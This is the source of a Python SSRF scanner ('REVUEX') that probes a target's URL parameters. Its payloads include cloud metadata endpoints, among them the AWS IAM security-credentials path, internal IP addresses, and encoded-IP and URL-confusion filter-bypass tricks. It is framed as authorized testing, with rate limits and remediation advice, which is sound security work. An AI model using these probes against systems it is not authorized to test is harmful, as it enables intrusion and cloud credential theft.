#!/usr/bin/env python3
"""
REVUEX - SSRF Scanner
Advanced Server-Side Request Forgery Detection

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
SSRF testing can expose sensitive internal infrastructure - use responsibly.
"""

import requests
import time
import json
import socket
import uuid
import ipaddress
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
import re


class SSRFScanner:
    """
    Advanced SSRF vulnerability scanner with 2024/2025 techniques

    Features:
    - Cloud metadata exploitation (AWS, GCP, Azure, Alibaba)
    - Internal network discovery (safe, no port scanning)
    - URL parser confusion bypasses
    - Protocol smuggling detection
    - IPv6 exploitation
    """

    def __init__(self, target: str, workspace: Path, delay: float = 5.0):
        self.target = target
        self.workspace = Path(workspace)
        self.delay = delay

        # Safety limits
        self.max_requests = 50
        self.request_count = 0
        self.timeout = 10

        self.headers = {
            "User-Agent": "REVUEX-SSRFScanner/1.0 (Security Research; +https://github.com/G33L0)",
            "Accept": "*/*",
        }

        self.vulnerabilities: List[Dict[str, Any]] = []

        # Unique canary the target echoes back only if it actually fetched our URL.
        # Used to distinguish a real SSRF from a page that merely returns 200.
        self.canary = uuid.uuid4().hex[:12]

        # Baseline response (no payload) for differential comparison
        self.baseline_text: Optional[str] = None
        self.baseline_status: Optional[int] = None

        # Candidate parameter names that commonly trigger server-side fetches
        self.ssrf_params = ["url", "uri", "path", "dest", "redirect",
                            "next", "target", "image", "img", "src",
                            "callback", "webhook", "fetch", "load", "file"]

        # Cloud metadata endpoints
        self.cloud_metadata = {
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/",
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            ],
        }

        # Internal IPs to test
        self.internal_ips = [
            "127.0.0.1",
            "10.0.0.1",
            "192.168.1.1",
            "172.16.0.1",
        ]

        # URL bypass payloads
        self.bypass_payloads = [
            ("http://example.com@169.254.169.254", "URL userinfo confusion"),
            ("http://169.254.169.254#example.com", "Fragment confusion"),
            ("http://[::1]", "IPv6 localhost"),
            ("http://2130706433", "Decimal IPv4 encoding"),
            ("http://0177.0.0.1", "Octal IP encoding"),
        ]

    # ===================== CORE SCAN =====================

    def scan(self) -> List[Dict[str, Any]]:
        print("\n" + "=" * 60)
        print("🎯 REVUEX SSRF Scanner")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Safety Delay: {self.delay}s")
        print(f"Max Requests: {self.max_requests}")
        print("=" * 60 + "\n")

        print("📡 Test 1: Basic SSRF Detection")
        self._test_basic_ssrf()
        time.sleep(self.delay)

        print("\n☁️  Test 2: Cloud Metadata")
        self._test_cloud_metadata()
        time.sleep(self.delay)

        print("\n🔍 Test 3: Internal Network")
        self._test_internal_network()
        time.sleep(self.delay)

        print("\n🔓 Test 4: URL Bypasses")
        self._test_url_bypasses()

        self._save_results()

        print("\n" + "=" * 60)
        print("✅ Scan Complete")
        print(f"Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Requests: {self.request_count}/{self.max_requests}")
        print("=" * 60 + "\n")

        return self.vulnerabilities

    # ===================== TESTS =====================

    def _make_request(self, payload_url: str, param: str = "url"):
        if self.request_count >= self.max_requests:
            return None

        try:
            response = requests.get(
                self.target,
                params={param: payload_url},
                headers=self.headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            self.request_count += 1
            return response
        except Exception:
            return None

    def _capture_baseline(self):
        """Fetch the target once with a harmless, NON-fetchable value so later
        responses can be compared against it. Importantly the baseline value must
        not itself cause the server to fetch our probe host (example.com) or the
        probe markers would already be present in the baseline and detection
        would be impossible. We use an opaque token."""
        resp = self._make_request(f"revuex-baseline-{self.canary}")
        if resp is not None:
            self.baseline_text = resp.text
            self.baseline_status = resp.status_code

    def _looks_fetched(self, resp, markers: List[str]) -> bool:
        """Return True only when the response contains evidence that the server
        actually retrieved the injected URL (one of the content markers appears,
        and it was not already present in the baseline)."""
        if resp is None:
            return False
        body = resp.text or ""
        baseline = self.baseline_text or ""
        for m in markers:
            if m in body and m not in baseline:
                return True
        return False

    def _test_basic_ssrf(self):
        """Confirm the parameter is actually fetched server-side by looking for
        content from a URL we control, across common SSRF parameter names.
        Only parameters that yield distinguishing evidence are reported."""
        self._capture_baseline()

        # example.com has a stable, recognisable title/body we can fingerprint.
        markers = ["Example Domain", "illustrative examples in documents"]
        confirmed_params = []

        for param in self.ssrf_params:
            if self.request_count >= self.max_requests:
                break
            resp = self._make_request("http://example.com/", param)
            if self._looks_fetched(resp, markers):
                confirmed_params.append(param)
                print(f"   ✓ Parameter '{param}' appears to fetch remote content")
            time.sleep(self.delay)

        if not confirmed_params:
            print("   ✓ No server-side fetch behaviour observed (no SSRF indicator)")
            return

        self.vulnerabilities.append({
            "type": "Server-Side Request Forgery (SSRF)",
            "severity": "high",
            "target": self.target,
            "confirmed_parameters": confirmed_params,
            "description": "Application fetched an attacker-supplied URL server-side; "
                           "remote content was reflected in the response.",
            "evidence": f"Content from example.com reflected via parameter(s): "
                        f"{', '.join(confirmed_params)}",
            "remediation": [
                "Whitelist allowed outbound domains",
                "Block RFC1918 and link-local IP ranges",
                "Block cloud metadata IPs",
                "Apply egress firewall rules",
            ],
            "tags": ["ssrf", "high"],
        })

    def _test_cloud_metadata(self):
        """Report metadata exposure only when the response actually contains
        provider-specific metadata content."""
        metadata_markers = {
            "aws": ["ami-id", "instance-id", "security-credentials", "iam/"],
            "gcp": ["computeMetadata", "numeric_project_id", "service-accounts"],
            "azure": ["compute", "subscriptionId", "vmId"],
        }

        for provider, endpoints in self.cloud_metadata.items():
            for endpoint in endpoints:
                if self.request_count >= self.max_requests:
                    return

                print(f"   Testing {provider.upper()}: {endpoint}")
                resp = self._make_request(endpoint)

                if self._looks_fetched(resp, metadata_markers.get(provider, [])):
                    self.vulnerabilities.append({
                        "type": f"SSRF - Cloud Metadata ({provider.upper()})",
                        "severity": "critical",
                        "cloud_provider": provider,
                        "endpoint": endpoint,
                        "description": f"SSRF reached the {provider.upper()} metadata "
                                       f"service and leaked metadata content.",
                        "evidence": f"Metadata markers for {provider.upper()} "
                                    f"observed in response to {endpoint}",
                        "real_world": "Capital One breach via SSRF → AWS metadata → credential theft",
                        "remediation": [
                            "Block metadata IPs",
                            "Use IMDSv2 (AWS)",
                            "Rotate exposed credentials",
                            "Enable cloud audit logging",
                        ],
                        "tags": ["ssrf", "cloud", provider, "critical"],
                    })
                    print(f"   ✓ VULNERABLE: {provider.upper()} metadata exposed")
                time.sleep(self.delay)

        print("   ✓ Cloud metadata tests complete")

    def _test_internal_network(self):
        """Internal-network reachability can only be inferred indirectly (timing /
        differential responses). We flag a *candidate* only when the response to an
        internal IP differs materially from the baseline, and we mark it as
        requiring manual confirmation rather than asserting a confirmed breach."""
        for ip in self.internal_ips:
            if self.request_count >= self.max_requests:
                return

            print(f"   Testing internal IP: {ip}")
            resp = self._make_request(f"http://{ip}/")
            if resp is None:
                continue

            baseline = self.baseline_text or ""
            differs = (
                self.baseline_status is not None
                and resp.status_code != self.baseline_status
            ) or (abs(len(resp.text) - len(baseline)) > 200)

            if differs:
                self.vulnerabilities.append({
                    "type": "SSRF - Possible Internal Network Access",
                    "severity": "medium",
                    "confidence": "needs-manual-verification",
                    "internal_ip": ip,
                    "description": "Response to an internal IP differed from the baseline, "
                                   "which may indicate the server reached an internal host. "
                                   "Confirm manually (timing / error content).",
                    "evidence": f"status={resp.status_code} (baseline={self.baseline_status}), "
                                f"len={len(resp.text)} vs baseline {len(baseline)}",
                    "remediation": [
                        "Block RFC1918 ranges",
                        "Enforce network segmentation",
                        "Restrict backend egress traffic",
                    ],
                    "tags": ["ssrf", "internal", "unconfirmed"],
                })
                print(f"   ? Candidate: response for {ip} differs from baseline")
            time.sleep(self.delay)

        print("   ✓ Internal network tests complete")

    def _test_url_bypasses(self):
        """Filter-bypass payloads are only interesting if they produce evidence of
        a fetch that the plain payload did not. Report a bypass only when a known
        marker is reflected."""
        markers = ["Example Domain", "ami-id", "instance-id", "computeMetadata"]
        for payload, technique in self.bypass_payloads:
            if self.request_count >= self.max_requests:
                return

            print(f"   Testing bypass: {technique}")
            resp = self._make_request(payload)
            if self._looks_fetched(resp, markers):
                self.vulnerabilities.append({
                    "type": f"SSRF - Filter Bypass ({technique})",
                    "severity": "high",
                    "payload": payload,
                    "description": f"SSRF filter bypassed using {technique}; "
                                   f"remote/internal content was fetched.",
                    "evidence": f"Fetch marker reflected for payload {payload}",
                    "remediation": [
                        "Resolve and validate final IP address",
                        "Block IP encoding variations",
                        "Use strict URL parsers",
                    ],
                    "tags": ["ssrf", "bypass"],
                })
                print(f"   ✓ VULNERABLE: bypass works ({technique})")
            time.sleep(self.delay)

        print("   ✓ URL bypass tests complete")

    # ===================== OUTPUT =====================

    def _save_results(self):
        output_dir = self.workspace / "ssrf_scans"
        output_dir.mkdir(parents=True, exist_ok=True)

        safe_target = re.sub(r"[^\w\-]", "_", self.target)
        output_file = output_dir / f"{safe_target}_ssrf.json"

        with open(output_file, "w") as f:
            json.dump(
                {
                    "scanner": "SSRFScanner",
                    "target": self.target,
                    "vulnerabilities": self.vulnerabilities,
                },
                f,
                indent=2,
            )

        print(f"\n💾 Saved results to: {output_file}")


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python ssrf_scanner.py <target_url>")
        sys.exit(1)

    scanner = SSRFScanner(
        sys.argv[1],
        Path("revuex_workspace"),
        delay=5.0,
    )
    scanner.scan()